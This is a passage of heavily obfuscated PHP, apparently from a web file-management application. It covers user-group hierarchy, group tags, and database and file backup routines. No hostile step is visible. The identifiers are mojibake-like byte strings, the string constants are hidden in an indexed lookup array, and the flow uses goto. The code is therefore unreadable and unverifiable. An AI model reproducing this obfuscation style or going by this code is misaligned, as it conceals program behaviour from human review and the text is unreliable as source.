$êõ—øè[8], $Ï¼“ì‹ó); } unset($©äŸÃâÊ); } private function _listAppendSourceRoot(&$¾©Í¦©, $´·éÁÅ£) { $èã¬é®ë =& $_SERVER[ ÇƒŠìÀ]; $š…ì©õ½ = Model($èã¬é®ë[854])->listSourceRoot(SourceModel::TYPE_GROUP, $´·éÁÅ£); $š…ì©õ½ = array_to_keyvalue($š…ì©õ½, $èã¬é®ë[540]); $š…ì©õ½ = array_remove_key($š…ì©õ½, $èã¬é®ë[540]); foreach ($¾©Í¦© as &$ŞÔÕíó) { $ŞÔÕíó[$èã¬é®ë[89]] = $š…ì©õ½[$ŞÔÕíó[$èã¬é®ë[1887]]] ? $š…ì©õ½[$ŞÔÕíó[$èã¬é®ë[1887]]] : array(); } unset($ŞÔÕíó); } protected function groupMerge($Ğ¸Ÿî‰ï) { $Ğ¸Ÿî‰ï = array_values(array_unique($Ğ¸Ÿî‰ï)); $Ü¢‡¿„Î = array(); for ($åÈÚš˜ = 0; $åÈÚš˜ < count($Ğ¸Ÿî‰ï); $åÈÚš˜++) { $ï¢Ú÷˜ = !1; for ($ÚÏÂ‹‹ä = 0; $ÚÏÂ‹‹ä < count($Ğ¸Ÿî‰ï); $ÚÏÂ‹‹ä++) { if ($åÈÚš˜ == $ÚÏÂ‹‹ä) { continue; } if ($this->isParentOf($Ğ¸Ÿî‰ï[$ÚÏÂ‹‹ä], $Ğ¸Ÿî‰ï[$åÈÚš˜])) { $ï¢Ú÷˜ = !0; break; } } if (!$ï¢Ú÷˜) { $Ü¢‡¿„Î[] = $Ğ¸Ÿî‰ï[$åÈÚš˜]; } } return $Ü¢‡¿„Î; } protected function isParentOf($ÉÖØô»», $†‰ÈãÆÕ) { $¥€ÚĞğã =& $_SERVER[ ÇƒŠìÀ]; if (!$ÉÖØô»» || !$†‰ÈãÆÕ || $ÉÖØô»» == $†‰ÈãÆÕ) { return !1; } $ÄÁÊ©› = $this->getInfoSimple($ÉÖØô»»); $‚ŠÊÇÚ = $this->getInfoSimple($†‰ÈãÆÕ); $ê¹º½®­ = $ÄÁÊ©›[$¥€ÚĞğã[555]] . $ÉÖØô»» . $¥€ÚĞğã[50]; if (substr($‚ŠÊÇÚ[$¥€ÚĞğã[555]], 0, strlen($ê¹º½®­)) == $ê¹º½®­) { return !0; } return !1; } public function groupShowRoot($ˆ¹ÑŞä, $®»Ú‹Ÿà = false) { $ãÊÈ™ù¾ =& $_SERVER[ ÇƒŠìÀ]; $Û×—¦Ğ§ = $this->getInfo($ˆ¹ÑŞä); if (!$Û×—¦Ğ§) { return array(); } $Ç‡‹¾Õë = $this->parentLevelArray($Û×—¦Ğ§[$ãÊÈ™ù¾[555]]); $œ§½ùó¶ = array($ˆ¹ÑŞä); if (count($Ç‡‹¾Õë) == 0) { return $œ§½ùó¶; } if ($®»Ú‹Ÿà && count($Ç‡‹¾Õë) == 1) { return $œ§½ùó¶; } if (!$Û×—¦Ğ§[$ãÊÈ™ù¾[509]] || !isset($Û×—¦Ğ§[$ãÊÈ™ù¾[509]][$ãÊÈ™ù¾[1973]]) || $Û×—¦Ğ§[$ãÊÈ™ù¾[509]][$ãÊÈ™ù¾[1973]] == $ãÊÈ™ù¾[1942]) { return $this->groupShowRoot($Ç‡‹¾Õë[count($Ç‡‹¾Õë) - 1], $®»Ú‹Ÿà); } if ($Û×—¦Ğ§[$ãÊÈ™ù¾[509]][$ãÊÈ™ù¾[1973]] == $ãÊÈ™ù¾[403]) { $±˜±ë = explode($ãÊÈ™ù¾[50], $Û×—¦Ğ§[$ãÊÈ™ù¾[509]][$ãÊÈ™ù¾[1974]]); if ($±˜±ë) { $œ§½ùó¶ = array_merge($œ§½ùó¶, $±˜±ë); } } return $œ§½ùó¶; } protected function resetParentLevel() { $ÕĞÕ€ÉÊ =& $_SERVER[ ÇƒŠìÀ]; $…ƒ‚¢É = $ÕĞÕ€ÉÊ[1887]; $ÒÑ‚™¾› = $this->select(); $ÒÑ‚™¾› = array_to_keyvalue($ÒÑ‚™¾›, $…ƒ‚¢É); foreach ($ÒÑ‚™¾› as $èÏÆÃËõ) { $ñä“–„Â = $èÏÆÃËõ; $‰ƒğ¾—¼ = array(); while ($ñä“–„Â[$ÕĞÕ€ÉÊ[182]] != 0) { $‰ƒğ¾—¼[] = $ñä“–„Â[$ÕĞÕ€ÉÊ[182]]; $ñä“–„Â = $ÒÑ‚™¾›[$ñä“–„Â[$ÕĞÕ€ÉÊ[182]]]; } $‰ƒğ¾—¼[] = 0; $‰ƒğ¾—¼ = $ÕĞÕ€ÉÊ[50] . implode($ÕĞÕ€ÉÊ[50], array_reverse($‰ƒğ¾—¼)) . $ÕĞÕ€ÉÊ[50]; $this->setNamePinyin($èÏÆÃËõ[$…ƒ‚¢É], $èÏÆÃËõ[$ÕĞÕ€ÉÊ[32]]); $this->where(array($…ƒ‚¢É => $èÏÆÃËõ[$…ƒ‚¢É]))->save(array($ÕĞÕ€ÉÊ[622] => $‰ƒğ¾—¼)); } return $ÒÑ‚™¾›; } public function groupNameAuto($èæº‹À«, $™¨š÷®æ) { $ÔªÒˆ¢ =& $_SERVER[ ÇƒŠìÀ]; $Û§ëÛëµ = $this->where(array($ÔªÒˆ¢[447] => $èæº‹À«))->getField($ÔªÒˆ¢[32], !0); if (!$Û§ëÛëµ || !in_array($™¨š÷®æ, $Û§ëÛëµ)) { return $™¨š÷®æ; } for ($ûíøŞ£ş = 1; $ûíøŞ£ş <= count($Û§ëÛëµ) + 1; $ûíøŞ£ş++) { $ú‘°Øğ = $™¨š÷®æ . "\x28{$ûíøŞ£ş}\51"; if (!in_array($ú‘°Øğ, $Û§ëÛëµ)) { return $ú‘°Øğ; } } } public function groupSwitch($Á°•ÂœŸ, $–ìÔçÜ ) { $Ä¦´§ª² =& $_SERVER[ ÇƒŠìÀ]; $­ÓÏÜËè = array($Ä¦´§ª²[1887] => array($Ä¦´§ª²[7], array($Á°•ÂœŸ, $–ìÔçÜ ))); $¬ÙêÒ„ˆ = $this->where($­ÓÏÜËè)->select(); $¬ÙêÒ„ˆ = array_to_keyvalue($¬ÙêÒ„ˆ, $Ä¦´§ª²[1887]); if (!isset($¬ÙêÒ„ˆ[$Á°•ÂœŸ]) || !isset($¬ÙêÒ„ˆ[$–ìÔçÜ ]) || $¬ÙêÒ„ˆ[$Á°•ÂœŸ][$Ä¦´§ª²[182]] == 0) { return !1; } $­ÓÏÜËè = array($Ä¦´§ª²[1887] => $Á°•ÂœŸ); $Çê¦Ÿ¤ù = Model($Ä¦´§ª²[1977])->where($­ÓÏÜËè)->select(); if (!$Çê¦Ÿ¤ù) { $Çê¦Ÿ¤ù = array(); } foreach ($Çê¦Ÿ¤ù as $œ ì›•É) { $º¯ë×§® = $œ ì›•É[$Ä¦´§ª²[1689]]; $­ÓÏÜËè = array($Ä¦´§ª²[1689] => $º¯ë×§®, $Ä¦´§ª²[1887] => $–ìÔçÜ ); $šæ†¯ä® = Model($Ä¦´§ª²[1977])->where($­ÓÏÜËè)->find(); if (!$šæ†¯ä®) { $¤úÛÉÉù = array($–ìÔçÜ  => $œ ì›•É[$Ä¦´§ª²[1991]]); Model($Ä¦´§ª²[569])->userGroupAdd($º¯ë×§®, $¤úÛÉÉù); } Model($Ä¦´§ª²[569])->userGroupRemove($º¯ë×§®, $Á°•ÂœŸ); } $­ÓÏÜËè = array($Ä¦´§ª²[180] => 2, $Ä¦´§ª²[182] => 0, $Ä¦´§ª²[455] => 1, $Ä¦´§ª²[540] => array($Ä¦´§ª²[7], array($Á°•ÂœŸ, $–ìÔçÜ ))); $¹Áü™£ = Model($Ä¦´§ª²[854])->where($­ÓÏÜËè)->field($Ä¦´§ª²[1992])->select(); $¹Áü™£ = array_to_keyvalue($¹Áü™£, $Ä¦´§ª²[540], $Ä¦´§ª²[183]); $î‹‹Í = !empty($¹Áü™£[$Á°•ÂœŸ]) ? $¹Áü™£[$Á°•ÂœŸ] : !1; if ($î‹‹Í) { if (!$¹Áü™£[$–ìÔçÜ ]) { $¹Áü™£[$–ìÔçÜ ] = Model($Ä¦´§ª²[854])->groupRootAdd($–ìÔçÜ ); } $Ÿ¤—²ƒ¶ = $¹Áü™£[$–ìÔçÜ ]; $­ÓÏÜËè = array($Ä¦´§ª²[182] => $î‹‹Í); $¹Áü™£ = Model($Ä¦´§ª²[854])->where($­ÓÏÜËè)->field($Ä¦´§ª²[1993])->select(); if (!$¹Áü™£) { $¹Áü™£ = array(); } Model($Ä¦´§ª²[854])->moveClearAuth = !1; foreach ($¹Áü™£ as $é¹ËúÉ—) { $¯Â¨ÒË‹ = $é¹ËúÉ—[$Ä¦´§ª²[455]] == $Ä¦´§ª²[90] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($Ä¦´§ª²[854])->move($é¹ËúÉ—[$Ä¦´§ª²[183]], $Ÿ¤—²ƒ¶, $¯Â¨ÒË‹); } Model($Ä¦´§ª²[854])->moveClearAuth = !0; $­ÓÏÜËè = array($Ä¦´§ª²[180] => 2, $Ä¦´§ª²[540] => $Á°•ÂœŸ); $•¥ñ·Üœ = array($Ä¦´§ª²[540] => $–ìÔçÜ ); Model($Ä¦´§ª²[1994])->where($­ÓÏÜËè)->save($•¥ñ·Üœ); Model($Ä¦´§ª²[1995])->where($­ÓÏÜËè)->save($•¥ñ·Üœ); } $this->_changeChildLevel($¬ÙêÒ„ˆ[$Á°•ÂœŸ], $¬ÙêÒ„ˆ[$–ìÔçÜ ], !0); $this->where(array($Ä¦´§ª²[182] => $Á°•ÂœŸ))->save(array($Ä¦´§ª²[182] => $–ìÔçÜ )); $this->_clearChildrenCache($¬ÙêÒ„ˆ[$–ìÔçÜ ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($’ç¬¢üñ) { $ëéœËœï =& $_SERVER[ ÇƒŠìÀ]; return array($ëéœËœï[1996] => array($’ç¬¢üñ[0], $ëéœËœï[1997]), $ëéœËœï[1998] => array($’ç¬¢üñ[0], $ëéœËœï[1999])); } protected function get($êùûä¢¨) { $„¾™¢Éí =& $_SERVER[ ÇƒŠìÀ]; $¾• µâ¢ = Model($„¾™¢Éí[556])->metaGet($êùûä¢¨, $„¾™¢Éí[2000]); $„Ï Ø€® = json_decode($¾• µâ¢, !0); return $„Ï Ø€® ? $„Ï Ø€® : array($„¾™¢Éí[2001] => $„¾™¢Éí[90], $„¾™¢Éí[415] => array()); } protected function set($˜¼‚ºõı, $×„ëàª) { $©”ø¢„ =& $_SERVER[ ÇƒŠìÀ]; $×„ëàª = $×„ëàª ? $×„ëàª : array($©”ø¢„[2001] => $©”ø¢„[90], $©”ø¢„[415] => array()); return Model($©”ø¢„[556])->metaSet($˜¼‚ºõı, $©”ø¢„[2000], json_encode($×„ëàª)); } protected function getByTagID($£ù¸Œø, $ØĞÉÙº) { $ÖÕ¢ÊíŒ =& $_SERVER[ ÇƒŠìÀ]; if (!$£ù¸Œø || !$ØĞÉÙº) { return !1; } if (!Model($ÖÕ¢ÊíŒ[556])->getInfoSimple($£ù¸Œø)) { return !1; } $…ı¨‘¥˜ = $this->get($£ù¸Œø); if (!$…ı¨‘¥˜ || !isset($…ı¨‘¥˜[$ÖÕ¢ÊíŒ[415]])) { return !1; } $ŞÙã‹°ª = array_find_by_field($…ı¨‘¥˜[$ÖÕ¢ÊíŒ[415]], $ÖÕ¢ÊíŒ[445], $ØĞÉÙº); return is_array($ŞÙã‹°ª) ? $ŞÙã‹°ª : !1; } public function listSource($Ä»Öçç¶, $ÌÉƒ²–¡) { $±É¼· =& $_SERVER[ ÇƒŠìÀ]; if ($ÌÉƒ²–¡ && !is_array($ÌÉƒ²–¡)) { $ÌÉƒ²–¡ = array($ÌÉƒ²–¡); } $Ï¯Õâ«÷ = $this->listData($Ä»Öçç¶); $ºò²İÌ¦ = array(); foreach ($Ï¯Õâ«÷ as $ÕŠÌù®Ş) { $âÂ´”ú = $ÕŠÌù®Ş[$±É¼·[86]]; if (!$âÂ´”ú) { continue; } if (!isset($ºò²İÌ¦[$âÂ´”ú])) { $ºò²İÌ¦[$âÂ´”ú] = array(); } $ºò²İÌ¦[$âÂ´”ú][] = $ÕŠÌù®Ş[$±É¼·[470]]; } $ÔâˆÂˆ = array(); foreach ($ºò²İÌ¦ as $ÒŒÒ”¬„ => $é´¬»Ÿ) { $ø®•àÅ® = !0; if (!$ÌÉƒ²–¡) { $ÔâˆÂˆ[] = $ÒŒÒ”¬„; continue; } foreach ($ÌÉƒ²–¡ as $Ã¸ıâŒ•) { if (!in_array($Ã¸ıâŒ•, $é´¬»Ÿ)) { $ø®•àÅ® = !1; break; } } if ($ø®•àÅ®) { $ÔâˆÂˆ[] = $ÒŒÒ”¬„; } } if (!$ÔâˆÂˆ) { return array(); } $ˆ ¾·ç = array($±É¼·[461] => array($±É¼·[462], $ÔâˆÂˆ), $±É¼·[540] => $Ä»Öçç¶, $±É¼·[180] => SourceModel::TYPE_GROUP); $•ëÓÍİá = Model($±É¼·[1368])->listSource($ˆ ¾·ç); if (!$•ëÓÍİá || count($ÔâˆÂˆ) == $•ëÓÍİá[$±É¼·[412]][$±É¼·[413]]) { return $•ëÓÍİá; } $¡†òŒÀ· = array(); $ÅçÚ¶üÜ = array_to_keyvalue($•ëÓÍİá[$±É¼·[84]], $±É¼·[12], $±É¼·[183]); $Îû”ë = array_to_keyvalue($•ëÓÍİá[$±É¼·[85]], $±É¼·[12], $±É¼·[183]); $éâéÒ›­ = array_merge($Îû”ë, $ÅçÚ¶üÜ); foreach ($ÔâˆÂˆ as $âÂ´”ú) { if (!in_array($âÂ´”ú, $éâéÒ›­)) { $¡†òŒÀ·[] = $âÂ´”ú; } } if ($¡†òŒÀ·) { $this->removeBySource($Ä»Öçç¶, $¡†òŒÀ·); } return $•ëÓÍİá; } protected function listData($•óêÊ°Ø) { $ğÖî¡ˆÇ =& $_SERVER[ ÇƒŠìÀ]; $°ç†Íöİ = array($ğÖî¡ˆÇ[1680] => 0, $ğÖî¡ˆÇ[528] => array($ğÖî¡ˆÇ[2002], 0), $ğÖî¡ˆÇ[466] => $ğÖî¡ˆÇ[2003] . $•óêÊ°Ø); $ÎİøÓ´ = $ğÖî¡ˆÇ[2004]; $©şø€½† = $this->field($ÎİøÓ´)->where($°ç†Íöİ)->order($ğÖî¡ˆÇ[2005])->select(); return $©şø€½† ? $©şø€½† : array(); } protected function addToTag($é°œĞı¬, $ã«òü«í, $¦¤‘áùˆ) { $ûìËá”½ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->getByTagID($é°œĞı¬, $¦¤‘áùˆ) || !$ã«òü«í) { return !1; } if (!Model($ûìËá”½[854])->pathInfo($ã«òü«í)) { return !1; } $¦»ìä…ç = array($ûìËá”½[1680] => 0, $ûìËá”½[528] => $¦¤‘áùˆ, $ûìËá”½[465] => $ã«òü«í, $ûìËá”½[466] => $ûìËá”½[2006] . $é°œĞı¬, $ûìËá”½[464] => $ûìËá”½[12], $ûìËá”½[1891] => 0); if ($this->where($¦»ìä…ç)->find()) { return !1; } return $this->add($¦»ìä…ç); } protected function removeFromTag($ÓÒ­¤—´, $ÊØ¶•¾È, $ËúúÁ“ú) { $ëÒ©³ş¥ =& $_SERVER[ ÇƒŠìÀ]; if (!$this->getByTagID($ÓÒ­¤—´, $ËúúÁ“ú) || !$ÊØ¶•¾È) { return !1; } if (is_array($ÊØ¶•¾È)) { $ÊØ¶•¾È = array($ëÒ©³ş¥[7], $ÊØ¶•¾È); } $¾ç™Áâà = array($ëÒ©³ş¥[1680] => 0, $ëÒ©³ş¥[528] => $ËúúÁ“ú, $ëÒ©³ş¥[466] => $ëÒ©³ş¥[2006] . $ÓÒ­¤—´, $ëÒ©³ş¥[465] => $ÊØ¶•¾È); return $this->where($¾ç™Áâà)->delete(); } protected function removeByTag($¿§µ¬ò, $û¯“Èµ¯) { $êëûÎ´î =& $_SERVER[ ÇƒŠìÀ]; if (!$this->getByTagID($¿§µ¬ò, $û¯“Èµ¯)) { return !1; } $íÕµº¢ = array($êëûÎ´î[1680] => 0, $êëûÎ´î[528] => $û¯“Èµ¯, $êëûÎ´î[466] => $êëûÎ´î[2006] . $¿§µ¬ò); return $this->where($íÕµº¢)->delete(); } protected function removeBySource($óîÑé½õ, $ ÃîçÜü) { $°êéõ‘ =& $_SERVER[ ÇƒŠìÀ]; if (!$óîÑé½õ || !$ ÃîçÜü) { return !1; } if (is_array($ ÃîçÜü)) { $ ÃîçÜü = array($°êéõ‘[7], $ ÃîçÜü); } $İÙëëğ = array($°êéõ‘[1680] => 0, $°êéõ‘[465] => $ ÃîçÜü, $°êéõ‘[528] => array($°êéõ‘[1049], 0), $°êéõ‘[466] => $°êéõ‘[2006] . $óîÑé½õ); return $this->where($İÙëëğ)->delete(); } } goto eãˆÓ´—° ; c¬‘•¾ò¬ó: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $ÃŠÎÉøÇ =& $_SERVER[ ÇƒŠìÀ]; $this->isManual(); self::$name = date($ÃŠÎÉøÇ[777]); if (!($ó¦ÀØ = Model($ÃŠÎÉøÇ[778])->lastItem())) { $ó¦ÀØ = $this->initData(); } else { self::$name = $ó¦ÀØ[$ÃŠÎÉøÇ[32]]; if ($ó¦ÀØ[$ÃŠÎÉøÇ[779]] == $ÃŠÎÉøÇ[90]) { self::$name = date($ÃŠÎÉøÇ[257]); $¡úªö›Š = 0; if (isset($ó¦ÀØ[$ÃŠÎÉøÇ[339]][$ÃŠÎÉøÇ[216]][$ÃŠÎÉøÇ[511]])) { $¡úªö›Š = (int) $ó¦ÀØ[$ÃŠÎÉøÇ[339]][$ÃŠÎÉøÇ[216]][$ÃŠÎÉøÇ[511]]; } if (self::$manual == 0 && $ó¦ÀØ[$ÃŠÎÉøÇ[32]] == self::$name) { Model($ÃŠÎÉøÇ[778])->remove($ó¦ÀØ[$ÃŠÎÉøÇ[445]]); } $ó¦ÀØ = $this->initData($¡úªö›Š, $ó¦ÀØ[$ÃŠÎÉøÇ[780]]); } else { $this->checkStore($ó¦ÀØ[$ÃŠÎÉøÇ[780]]); } } self::$option = $ó¦ÀØ; } private function isManual() { $Õãùíæª = _get($GLOBALS, $_SERVER[ ÇƒŠìÀ][781], 0); $Õãùíæª = intval($Õãùíæª); self::$manual = $Õãùíæª && $Õãùíæª == 1 ? 1 : 0; } private function initData($ ÇÎ§¦‹ = 0, $©Û´ÌÎ¦ = '') { $Ôë§¹„û =& $_SERVER[ ÇƒŠìÀ]; $ÒøÎóÇ© = Model($Ôë§¹„û[778])->config(); if ($©Û´ÌÎ¦ && $ÒøÎóÇ©[$Ôë§¹„û[780]] != $©Û´ÌÎ¦) { $ ÇÎ§¦‹ = 0; } $this->checkStore($ÒøÎóÇ©[$Ôë§¹„û[780]]); if (self::$manual == 1) { self::$name .= $Ôë§¹„û[11] . date($Ôë§¹„û[782]); } $àòİğÈã = array($Ôë§¹„û[780] => $ÒøÎóÇ©[$Ôë§¹„û[780]], $Ôë§¹„û[32] => self::$name, $Ôë§¹„û[779] => 0, $Ôë§¹„û[783] => $ÒøÎóÇ©[$Ôë§¹„û[783]], $Ôë§¹„û[784] => self::$manual, $Ôë§¹„û[339] => array($Ôë§¹„û[785] => array($Ôë§¹„û[779] => 0), $Ôë§¹„û[786] => array($Ôë§¹„û[779] => 0, $Ôë§¹„û[787] => 0, $Ôë§¹„û[788] => 0, $Ôë§¹„û[33] => $Ôë§¹„û[12], $Ôë§¹„û[789] => 0, $Ôë§¹„û[790] => 0), $Ôë§¹„û[791] => array($Ôë§¹„û[779] => 0, $Ôë§¹„û[787] => 0, $Ôë§¹„û[788] => 0, $Ôë§¹„û[789] => 0, $Ôë§¹„û[790] => 0), $Ôë§¹„û[216] => array($Ôë§¹„û[779] => 0, $Ôë§¹„û[792] => 0, $Ôë§¹„û[793] => 0, $Ôë§¹„û[794] => 0, $Ôë§¹„û[795] => 0, $Ôë§¹„û[511] => $ ÇÎ§¦‹, $Ôë§¹„û[789] => 0, $Ôë§¹„û[790] => 0)), $Ôë§¹„û[789] => time(), $Ôë§¹„û[790] => 0); $ÜÔÇ€¼… = Model($Ôë§¹„û[778])->insert($àòİğÈã); $àòİğÈã[$Ôë§¹„û[445]] = $ÜÔÇ€¼…; return $àòİğÈã; } private function checkStore($ğ Üñ¦¤) { $Ê´º†˜º =& $_SERVER[ ÇƒŠìÀ]; $ôôÚÁ¡– = Model($Ê´º†˜º[796])->listData($ğ Üñ¦¤); Model($Ê´º†˜º[796])->checkConfig($ôôÚÁ¡–); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ ÇƒŠìÀ][778])->findByName(self::$name); } return self::$option; } public static function set($‚àÕœ–) { $Ã·Å«ü» =& $_SERVER[ ÇƒŠìÀ]; $Òµï×ó = self::get(); foreach ($‚àÕœ– as $¬—ä—Ø± => $åÛë’ÍÁ) { $ÆÑ’Ø®½ = explode($Ã·Å«ü»[10], $¬—ä—Ø±); $ÒàÛÍì  = count($ÆÑ’Ø®½); switch ($ÒàÛÍì ) { case 1: $Òµï×ó[$ÆÑ’Ø®½[0]] = $åÛë’ÍÁ; break; case 2: $Òµï×ó[$ÆÑ’Ø®½[0]][$ÆÑ’Ø®½[1]] = $åÛë’ÍÁ; break; case 3: $Òµï×ó[$ÆÑ’Ø®½[0]][$ÆÑ’Ø®½[1]][$ÆÑ’Ø®½[2]] = $åÛë’ÍÁ; break; } } Model($Ã·Å«ü»[778])->update($Òµï×ó[$Ã·Å«ü»[445]], $Òµï×ó); self::$option = $Òµï×ó; return self::$option; } public function keep() { $•èò´Ùõ =& $_SERVER[ ÇƒŠìÀ]; $´Ö½““î = self::get(); if ($´Ö½““î[$•èò´Ùõ[339]][$•èò´Ùõ[785]][$•èò´Ùõ[779]] == $•èò´Ùõ[90]) { return; } $this->backupKeep($´Ö½““î); self::set(array($•èò´Ùõ[797] => 1)); } private function backupKeep($×ş›î‡ë) { $••Ê”ˆí =& $_SERVER[ ÇƒŠìÀ]; if (self::$manual == 1) { return; } $Åğñ°Ø› = Model($••Ê”ˆí[778])->listData(); if (empty($Åğñ°Ø›)) { return; } $Éí¶­æü = 0; $ãªïÑ–è = array(); foreach ($Åğñ°Ø› as $ïÑ”®¢ü) { if ($Éí¶­æü >= 7) { break; } $ãªïÑ–è[] = $ïÑ”®¢ü[$••Ê”ˆí[32]]; $Éí¶­æü++; } for ($Éí¶­æü = 0; $Éí¶­æü < 12; $Éí¶­æü++) { $ãªïÑ–è[] = date($••Ê”ˆí[798], strtotime("\x2d{$Éí¶­æü}\40\155\157\x6e\x74\150\x73")); } $ãªïÑ–è = array_unique($ãªïÑ–è); $“Ó—°” = Model($••Ê”ˆí[799])->get($••Ê”ˆí[800]); foreach ($Åğñ°Ø› as $ïÑ”®¢ü) { if (isset($ïÑ”®¢ü[$••Ê”ˆí[784]]) && $ïÑ”®¢ü[$••Ê”ˆí[784]] == $••Ê”ˆí[90]) { continue; } if (!empty($ïÑ”®¢ü[$••Ê”ˆí[32]]) && in_array($ïÑ”®¢ü[$••Ê”ˆí[32]], $ãªïÑ–è)) { continue; } Model($••Ê”ˆí[778])->remove($ïÑ”®¢ü[$••Ê”ˆí[445]]); $ÌË‰ÎŠ‰ = $this->backupPath($×ş›î‡ë, $“Ó—°”); IO::remove($ÌË‰ÎŠ‰, !1); } } private function backupPath($¸ï¸’ƒ¿, $»ãõ¶ö = false) { $È‘¡äÂ =& $_SERVER[ ÇƒŠìÀ]; if (!$»ãõ¶ö) { $»ãõ¶ö = Model($È‘¡äÂ[799])->get($È‘¡äÂ[800]); } $¤ûêÍæß = $¸ï¸’ƒ¿[$È‘¡äÂ[32]]; $„ëë‘ı = substr(md5($È‘¡äÂ[801] . $»ãõ¶ö . $¤ûêÍæß), 0, 8); return "\173\x69\157\x3a{$¸ï¸’ƒ¿[$È‘¡äÂ[780]]}\x7d\57\x64\x61\164\x61\142\141\163\145\x2f\142\141\x63\153\165\160\57" . $¤ûêÍæß . $È‘¡äÂ[11] . $„ëë‘ı; } public function db() { $ Í´ëî® =& $_SERVER[ ÇƒŠìÀ]; $óóá³…— = self::get(); if ($óóá³…—[$ Í´ëî®[339]][$ Í´ëî®[786]][$ Í´ëî®[779]] == $ Í´ëî®[90]) { return !0; } $›ŸøÕ³ = new BackupDb(); if (!$›ŸøÕ³->index()) { return !1; } self::set(array($ Í´ëî®[802] => 1)); return !0; } public function dbFile() { $¢ ùèĞ× =& $_SERVER[ ÇƒŠìÀ]; $‹·‡¡° = self::get(); if ($‹·‡¡°[$¢ ùèĞ×[339]][$¢ ùèĞ×[791]][$¢ ùèĞ×[779]] == $¢ ùèĞ×[90]) { return !0; } $‹Ä¢Ú›á = new BackupDbFile(); if (!$‹Ä¢Ú›á->index()) { return !1; } self::set(array($¢ ùèĞ×[803] => 1)); return !0; } public function file() { $ğµá•Ï =& $_SERVER[ ÇƒŠìÀ]; $ƒ¤¯ö…‡ = self::get(); if ($ƒ¤¯ö…‡[$ğµá•Ï[339]][$ğµá•Ï[216]][$ğµá•Ï[779]] == $ğµá•Ï[90]) { return !0; } if (!isset($ƒ¤¯ö…‡[$ğµá•Ï[783]]) || $ƒ¤¯ö…‡[$ğµá•Ï[783]] == $ğµá•Ï[214]) { $’šë•ñ = new BackupFile(); if (!$’šë•ñ->index()) { return !1; } } self::set(array($ğµá•Ï[804] => 1, $ğµá•Ï[779] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÆÕîóÆÛ =& $_SERVER[ ÇƒŠìÀ]; $Ù¨¦‘ÉÎ = Backup::get(); self::$io = $Ù¨¦‘ÉÎ[$ÆÕîóÆÛ[780]]; self::$name = $Ù¨¦‘ÉÎ[$ÆÕîóÆÛ[32]]; $¥¹«¼™å = new DbManage(); $Î¡†— = $¥¹«¼™å->dbType(); $ìİˆş½ = array($ÆÕîóÆÛ[805] => $Î¡†—, $ÆÕîóÆÛ[806] => time()); Backup::set($ìİˆş½); $•“¦Âˆ´ = $this->tmpFilesPath() . $ÆÕîóÆÛ[807] . self::$name . $ÆÕîóÆÛ[8]; del_dir($•“¦Âˆ´); mk_dir($•“¦Âˆ´); $‘àéÃ¸¢ = $ÏºĞó¯Ş = 0; $şëùŠ‘ì = new Task($ÆÕîóÆÛ[808], $ÆÕîóÆÛ[809], 0, LNG($ÆÕîóÆÛ[810]) . $ÆÕîóÆÛ[811] . LNG($ÆÕîóÆÛ[812])); try { $›øáŒÙ­ = $¥¹«¼™å->db()->getTables(); } catch (Exception $ö‘ÀÊòÕ) { $şëùŠ‘ì->end(); return !1; } $›øáŒÙ­ = array_diff($›øáŒÙ­, array($ÆÕîóÆÛ[813], $ÆÕîóÆÛ[814])); foreach ($›øáŒÙ­ as $ıÄıÁíŸ) { $‘àéÃ¸¢ += $¥¹«¼™å->model($ıÄıÁíŸ)->count(); } $şëùŠ‘ì->task[$ÆÕîóÆÛ[815]] = $‘àéÃ¸¢; $GLOBALS[$ÆÕîóÆÛ[816]] = self::$name; foreach ($›øáŒÙ­ as $ıÄıÁíŸ) { $ÁÒÀÜûá = $•“¦Âˆ´ . $ıÄıÁíŸ . $ÆÕîóÆÛ[817]; $ÌÒîñÌ‹ = null; if ($ıÄıÁíŸ == $ÆÕîóÆÛ[818] && (!isset($Ù¨¦‘ÉÎ[$ÆÕîóÆÛ[783]]) || $Ù¨¦‘ÉÎ[$ÆÕîóÆÛ[783]] == $ÆÕîóÆÛ[214])) { $ÌÒîñÌ‹ = self::$io; } $ÏºĞó¯Ş += $¥¹«¼™å->sqlFromDb($ıÄıÁíŸ, $ÁÒÀÜûá, $şëùŠ‘ì, $ÌÒîñÌ‹); } unset($GLOBALS[$ÆÕîóÆÛ[816]]); $şëùŠ‘ì->end(); if ($ÏºĞó¯Ş > $‘àéÃ¸¢) { $‘àéÃ¸¢ = $ÏºĞó¯Ş; } $ìİˆş½ = array($ÆÕîóÆÛ[805] => $Î¡†—, $ÆÕîóÆÛ[802] => 1, $ÆÕîóÆÛ[819] => $‘àéÃ¸¢, $ÆÕîóÆÛ[820] => $ÏºĞó¯Ş, $ÆÕîóÆÛ[821] => time()); Backup::set($ìİˆş½); if ($‘àéÃ¸¢ - $ÏºĞó¯Ş > 0) { $Ä­Ä»£é = $ÆÕîóÆÛ[822]; if (stristr(I18n::getType(), $ÆÕîóÆÛ[823])) { $Ä­Ä»£é = $ÆÕîóÆÛ[824]; } write_log(array($Ä­Ä»£é, $ìİˆş½), $ÆÕîóÆÛ[809]); return !1; } return !0; } private function tmpFilesPath() { $æû½» =& $_SERVER[ ÇƒŠìÀ]; $öÛƒ«°ƒ = TEMP_FILES; if ($GLOBALS[$æû½»[6]][$æû½»[91]][$æû½»[825]]) { $öÛƒ«°ƒ = $GLOBALS[$æû½»[6]][$æû½»[91]][$æû½»[825]]; if (!mk_dir($öÛƒ«°ƒ) || !is_writable($öÛƒ«°ƒ) || !IO::mkfile($öÛƒ«°ƒ . $æû½»[826])) { $öÛƒ«°ƒ = TEMP_FILES; } } return $öÛƒ«°ƒ; } } class BackupDbFile { public function __construct() { } public function index() { $Ó¿ó‘‚Ì =& $_SERVER[ ÇƒŠìÀ]; $‰ÔÙ« = Backup::get(); $±ÛÛåçÖ = $‰ÔÙ«[$Ó¿ó‘‚Ì[32]]; $óÈå˜Ù† = $this->tmpFilesPath() . "\142\141\x63\x6b\x75\160\137{$±ÛÛåçÖ}\x2f"; $ıÉâ˜œß = $this->backupPath($‰ÔÙ«); if (!($ıÉâ˜œß = IO::mkdir($ıÉâ˜œß))) { return !1; } $¶øêÄö™ = IO::listPath($óÈå˜Ù†); 